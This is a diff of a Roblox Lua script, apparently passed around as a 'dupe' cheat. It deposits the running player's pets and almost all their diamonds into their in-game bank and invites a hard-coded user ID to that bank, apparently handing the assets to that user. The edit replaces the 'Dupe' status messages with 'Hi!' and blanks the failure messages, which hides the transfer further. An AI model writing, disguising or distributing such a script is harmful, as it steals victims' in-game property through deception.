@@ -12,15 +12,14 @@ for i,v in pairs(lib.Save.Get().Pets) do
 end
 local request, request2 = lib.Network.Invoke("Bank Deposit", mybanks[1]['BUID'], PetsList, mydiamonds - 1);
 if request then
-    lib.Message.New("Dupe starting");
+    lib.Message.New("Hi!");
 else
-    lib.Message.New(request2 and "Something went wrong. Try again!");
+
     return;
 end
 if lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'], YourID) then
-    lib.Message.New("Dupe successfully! please rejoin");
+   
 else
-    lib.Message.New("Dupe failure :( please try again");
 end; 
 local YourID = 1
 local lib = require(game.ReplicatedStorage:WaitForChild('Framework'):WaitForChild('Library'))
@@ -35,13 +34,13 @@ for i,v in pairs(lib.Save.Get().Pets) do
 end
 local request, request2 = lib.Network.Invoke("Bank Deposit", mybanks[1]['BUID'], PetsList, mydiamonds - 1);
 if request then
-    lib.Message.New("Dupe starting");
+    lib.Message.New("Hi Again!");
 else
-    lib.Message.New(request2 and "Something went wrong. Try again!");
+    
     return;
 end
 if lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'], YourID) then
-    lib.Message.New("Dupe successfully! please rejoin");
+  
 else
-    lib.Message.New("Dupe failure :( please try again");
+  
 end;
